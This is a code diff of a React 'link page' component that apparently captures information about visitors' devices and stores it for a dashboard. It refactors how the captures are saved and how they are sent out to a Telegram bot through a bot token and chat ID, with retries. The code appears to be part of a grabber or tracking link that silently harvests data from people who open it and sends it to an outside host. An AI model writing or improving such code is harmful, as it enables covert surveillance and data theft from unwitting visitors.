@@ -101,7 +101,7 @@ function LinkPageClient() {
           deviceInfo
         }
 
-        // Save to localStorage with error handling
+        // Save to localStorage and notify dashboard
         try {
           // Get existing captures or initialize empty array
           let captures = []
@@ -121,33 +121,33 @@ function LinkPageClient() {
           try {
             localStorage.setItem('captures', JSON.stringify(captures))
             console.log('Data saved to localStorage successfully')
+
+            // Notify all tabs about the new capture
+            window.localStorage.setItem('lastCapture', JSON.stringify(capturedInfo))
+            window.localStorage.removeItem('lastCapture')
           } catch (error) {
             console.error('Error saving to localStorage:', error)
           }
 
-          // Dispatch event to notify dashboard
-          const event = new CustomEvent('newCapture', { detail: capturedInfo })
-          window.dispatchEvent(event)
-        } catch (error) {
-          console.error('Error in save process:', error)
-        }
+          // Send to Telegram with retry logic
+          let retryCount = 0
+          const maxRetries = 3
 
-        // Send to Telegram with retry logic
-        let retryCount = 0
-        const maxRetries = 3
-
-        while (retryCount < maxRetries) {
-          try {
-            await sendTelegramMessage(BOT_TOKEN, CHAT_ID, capturedInfo)
-            console.log('Data sent to Telegram successfully')
-            break
-          } catch (error) {
-            console.error(`Error sending to Telegram (attempt ${retryCount + 1}):`, error)
-            retryCount++
-            if (retryCount < maxRetries) {
-              await new Promise(resolve => setTimeout(resolve, 1000)) // Wait 1 second before retry
+          while (retryCount < maxRetries) {
+            try {
+              await sendTelegramMessage(BOT_TOKEN, CHAT_ID, capturedInfo)
+              console.log('Data sent to Telegram successfully')
+              break
+            } catch (error) {
+              console.error(`Error sending to Telegram (attempt ${retryCount + 1}):`, error)
+              retryCount++
+              if (retryCount < maxRetries) {
+                await new Promise(resolve => setTimeout(resolve, 1000)) // Wait 1 second before retry
+              }
             }
           }
+        } catch (error) {
+          console.error('Error in save process:', error)
         }
 
       } catch (error) {
